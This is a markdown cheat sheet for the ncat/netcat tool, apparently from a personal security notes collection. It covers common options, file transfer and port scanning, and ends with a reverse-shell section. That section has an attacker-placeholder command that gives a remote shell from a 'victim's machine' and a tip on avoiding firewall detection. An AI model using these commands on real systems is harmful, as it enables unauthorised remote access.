---
id: netcat
aliases:
  - netcat
  - ncat
  - nc
tags:
  - Networking/Tools/Netcat
links: "[[Netcat]]"
resources:
  - "[Ncat](https://nmap.org/ncat/)"
  - "[Ncat Users' Guide](https://nmap.org/ncat/guide/index.html)"
  - "[ncat - man7.org](https://www.man7.org/linux/man-pages/man1/ncat.1.html)"
  - "[Netcat - Wikipedia](https://en.wikipedia.org/wiki/Netcat)"
---

# Netcat

`ncat` — Reimplementation of netcat maintained by the [Nmap](https://nmap.org/ncat/) team

## Usage

Synopsis

```sh
ncat [OPTIONS...] [hostname] [port]
```

<!-- Examples {{{-->
> [!example]-
>
> **Examples**
>
>```sh
># Execute the given command after connecting
>ncat -e /bin/bash localhost 8080
>
># Listen for incoming connections
>ncat -l 8080
>
># Do not resolve hostnames via DNS
>ncat -n localhost 8080
>
># Specify source port to use
>ncat -p 8080 localhost 8081
>
># Use source IP address
>ncat -s 192.168.1.5 localhost 8080
>
># Answer TELNET negotiation
>ncat -t localhost 8080
>
># Use UDP instead of default TCP
>ncat -u localhost 8080
>
># Verbose mode
>ncat -v localhost 8080
>
># Set a timeout for idle connection
>ncat -w 5 localhost 8080
>
># Zero-I/O mode, report connection status only
>ncat -z localhost 8080
>
># Banner grabbing
>nc -nv {target_ip} 21
>```
<!-- }}} -->

<!-- File Transfer {{{-->
### File Transfer

Listen to an incoming connection on port `8080` and write any received data to
`received_file`

```sh
ncat -l 8080 > <received_file>
```

Connect to a server on port `8080` and send the content of `file_to_send`

```sh
ncat localhost 8080 < <file_to_send>
```
<!-- }}} -->

<!-- Port Scanning {{{-->
### Port Scanning

Check if the port is open and then close the connection *(ports 80-90 through
`localhost`)*

```sh
ncat -v -n -z localhost 80-90
```
<!-- }}} -->

<!-- Reverse Shell {{{-->
### Reverse Shell

Open a listener and listen to an incoming connection

1. Open a netcat listener

```sh
ncat -lvnp <listening_port>
```

> [!example]-
>
> ```sh
> nc -lvnp 1234
> ```

> [!tip]-
>
> Keep the listening port below `1000` to avoid firewall detection

2. Initiate a connection from the victim's machine back to the attacker's machine

```sh
ncat <attacker_ip> <attacker_port> -e /bin/bash
```
<!-- }}} -->

## Resources

- [Ncat](https://nmap.org/ncat/)
- [Ncat Users' Guide](https://nmap.org/ncat/guide/index.html)
- [ncat - man7.org](https://www.man7.org/linux/man-pages/man1/ncat.1.html)
- [Netcat - Wikipedia](https://en.wikipedia.org/wiki/Netcat)
